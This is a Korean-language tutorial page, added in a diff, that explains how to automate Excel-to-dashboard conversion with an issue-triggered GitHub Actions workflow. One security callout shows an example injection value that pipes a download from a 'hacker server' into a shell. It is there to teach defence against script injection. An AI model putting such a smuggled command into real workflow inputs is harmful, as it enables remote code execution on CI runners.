@@ -1,0 +1,120 @@
+<h1>Step 3 · GitHub Actions 자동화</h1>
+<p class="lede">"이슈가 열리면 → Windows PC를 빌려서 → 엑셀을 변환하고 → 결과를 커밋해라." 이 문장을 GitHub이 알아듣는 YAML로 쓰는 단계입니다.</p>
+
+<h2>잠깐 이론: GitHub Actions의 4요소</h2>
+<div class="cards">
+  <div class="card card-work"><span class="card-icon">⚡</span><h3>Event (on)</h3><p>무엇이 일어나면 실행할지. push, pull_request, issues, 정해진 시간(schedule), 수동 실행 등.</p></div>
+  <div class="card card-repo"><span class="card-icon">🧩</span><h3>Job</h3><p>한 대의 runner에서 실행되는 작업 묶음. Job끼리는 기본적으로 <b>병렬</b>로 돌아요.</p></div>
+  <div class="card card-stage"><span class="card-icon">🖥️</span><h3>Runner (runs-on)</h3><p>GitHub이 빌려주는 일회용 가상 PC. ubuntu / windows / macos 중 선택.</p></div>
+  <div class="card card-remote"><span class="card-icon">📝</span><h3>Step</h3><p>순서대로 실행되는 명령. <code>run:</code>은 셸 명령, <code>uses:</code>는 남이 만든 Action 재사용.</p></div>
+</div>
+
+<h3>워크플로우 파일 해부</h3>
+<p><code>.github/workflows/</code> 폴더 안의 <code>.yml</code> 파일이 곧 워크플로우입니다. 들여쓰기(스페이스 2칸)가 의미를 가지니 주의하세요.</p>
+<pre data-lang="yaml">name: Excel → Dashboard          # Actions 탭에 보이는 이름
+
+on:                              # ⚡ 언제?
+  issues:
+    types: [opened]              #    이슈가 "열렸을 때"
+
+permissions:                     # 🔑 이 워크플로우가 가진 권한 (최소한만!)
+  contents: write                #    코드/브랜치에 push
+  issues: write                  #    이슈에 댓글
+
+jobs:
+  convert:                       # 🧩 Job 이름
+    if: startsWith(github.event.issue.title, '[EXCEL]')
+    runs-on: windows-latest      # 🖥️ Windows 가상 PC를 빌린다
+    steps:                       # 📝 순서대로 실행
+      - uses: actions/checkout@v4            # 저장소 코드 내려받기
+      - uses: actions/setup-python@v5        # 파이썬 설치
+        with: { python-version: "3.12" }
+      - run: pip install -r scripts/requirements.txt
+      - run: python scripts/excel_to_json.py input.xlsx --out build/data.json</pre>
+
+<figure class="shot" data-src="assets/img/screens/actions-run-detail.png">
+  <figcaption>Actions 탭의 실행 상세 화면 — 각 Step의 로그를 펼쳐 볼 수 있습니다</figcaption>
+</figure>
+
+<h3>꼭 알아야 할 보안 두 가지</h3>
+<div class="callout callout-danger">
+  <span class="callout-title">1. 스크립트 인젝션: 이슈 제목/본문을 run: 에 직접 넣지 마세요</span>
+  이슈는 <b>아무나</b> 쓸 수 있는 입력입니다. 아래처럼 쓰면, 이슈 제목에 <code>"; curl 해커서버 | sh; echo "</code> 같은 걸 넣어 runner에서 임의 명령을 실행할 수 있어요.
+  <pre data-lang="yaml" data-nocopy># ❌ 위험
+- run: echo "${{ github.event.issue.title }}"
+# ✅ 안전: 환경 변수로 전달하면 셸이 "명령"이 아닌 "값"으로 취급
+- env:
+    TITLE: ${{ github.event.issue.title }}
+  run: echo "$TITLE"</pre>
+</div>
+<div class="callout callout-warn">
+  <span class="callout-title">2. GITHUB_TOKEN과 Secrets</span>
+  워크플로우마다 GitHub이 자동으로 임시 토큰(<code>GITHUB_TOKEN</code>)을 발급합니다. 권한은 <code>permissions:</code>로 필요한 만큼만 주세요.
+  API 키 같은 비밀 값은 코드에 쓰지 말고 <b>Settings → Secrets and variables → Actions</b>에 저장한 뒤 <code>${{ secrets.이름 }}</code>으로 꺼내 씁니다. 로그에는 <code>***</code>로 가려져요.
+</div>
+
+<h2>3-1. 이슈 템플릿 + 워크플로우 만들기</h2>
+<pre data-lang="bash">git switch -c feature/actions</pre>
+<figure class="prompt-card">
+  <figcaption>프롬프트 3 · 이슈 → 변환 → docs 브랜치 자동화</figcaption>
+  <pre>Step 2에서 만든 변환기를 GitHub Actions로 자동 실행하게 해줘.
+
+## 1. 이슈 템플릿: .github/ISSUE_TEMPLATE/excel-upload.yml
+- 이슈 폼(form) 형식. 제목 기본값 "[EXCEL] ", 라벨 excel-upload
+- 파일을 끌어다 놓는 textarea(필수) 하나와 메모 input(선택) 하나
+- "공개 저장소의 첨부 파일은 누구나 내려받을 수 있다"는 경고 문구 포함
+
+## 2. 첨부 파일 다운로드: scripts/fetch_attachment.py
+- 환경 변수 ISSUE_BODY 에서 첫 번째 .xlsx 링크를 찾는다
+- github.com 또는 *.githubusercontent.com 도메인만 허용, 10MB 제한, 파일이 PK(zip)로 시작하는지 확인
+- github.com 으로 요청할 때만 GITHUB_TOKEN 을 Authorization 헤더로 붙인다
+- 원본 파일 이름을 GITHUB_OUTPUT 의 file_name 으로 내보낸다
+
+## 3. docs 브랜치 배포 스크립트: scripts/publish_docs.sh
+- dashboard/ 폴더의 파일과 build/data.json(있으면 data/data.json 으로)을 docs 브랜치에 커밋하고 push
+- docs 브랜치가 없으면 orphan 브랜치로 새로 만든다. git worktree 를 사용해 main 작업 폴더를 건드리지 않는다
+- .nojekyll 파일 추가, 변경이 없으면 커밋하지 않고 종료
+
+## 4. 워크플로우: .github/workflows/excel-to-dashboard.yml
+- on: issues opened
+- 조건: 제목이 [EXCEL] 로 시작 AND 작성자 author_association 이 OWNER, MEMBER, COLLABORATOR 중 하나
+- runs-on: windows-latest, timeout 20분, concurrency 그룹으로 동시 실행 방지
+- permissions: contents write, issues write 만
+- 단계: checkout → setup-python 3.12(pip 캐시) → 의존성 설치 → 첨부 다운로드 → 변환(--engine auto) → publish_docs.sh(bash) → 이슈에 Pages 주소와 실행 로그 링크를 댓글로 달고 이슈 닫기
+- 실패하면 이슈에 실패 댓글
+- 보안: github.event.issue.body/title 은 절대 run: 안에 직접 쓰지 말고 env 로 전달
+
+다 만들면 각 파일이 무슨 일을 하는지 표로 정리해줘.</pre>
+</figure>
+
+<h2>3-2. 저장소 설정 확인</h2>
+<ol class="steps">
+  <li><strong>라벨 만들기</strong> — 이슈 템플릿의 라벨이 저장소에 있어야 자동으로 붙어요.
+    <pre data-lang="bash">gh label create excel-upload --color 4F46E5 --description "엑셀 데이터 업로드"</pre>
+  </li>
+  <li><strong>Actions 권한 확인</strong> — <b>Settings → Actions → General → Workflow permissions</b>. 워크플로우의 <code>permissions:</code>가 우선하지만, 조직 정책으로 막혀 있다면 "Read and write permissions"를 선택해야 할 수 있어요.
+    <figure class="shot" data-src="assets/img/screens/actions-permissions.png">
+      <figcaption>Settings → Actions → General → Workflow permissions</figcaption>
+    </figure>
+  </li>
+  <li><strong>커밋 &amp; push</strong>
+    <pre data-lang="bash">git add .
+git commit -m "이슈 기반 엑셀 변환 워크플로우 추가"
+git switch main && git merge feature/actions && git push</pre>
+  </li>
+</ol>
+
+<div class="callout callout-tip">
+  <span class="callout-title">💡 YAML이 맞는지 확인하는 법</span>
+  push 후 <b>Actions</b> 탭에 "Excel → Dashboard" 워크플로우가 목록에 보이면 문법은 통과입니다. 빨간 경고가 보이면 Claude에게 오류 메시지를 그대로 붙여넣고 고쳐 달라고 하세요.
+</div>
+
+<div class="quiz" data-answer="c">
+  <p class="quiz-q">이 워크플로우에 <code>author_association</code> 조건이 없다면 어떤 일이 생길 수 있을까요?</p>
+  <div class="quiz-options">
+    <button type="button" data-opt="a">아무 일도 없다. 이슈는 저장소 주인만 쓸 수 있다</button>
+    <button type="button" data-opt="b">워크플로우가 실행되지 않는다</button>
+    <button type="button" data-opt="c">공개 저장소에선 누구나 엑셀을 올려 대시보드 데이터를 바꿀 수 있다</button>
+  </div>
+  <p class="quiz-explain">정답! 공개 저장소의 이슈는 GitHub 계정만 있으면 누구나 열 수 있어요. "누가 이 자동화를 깨울 수 있는가"는 항상 따져 봐야 합니다.</p>
+</div>
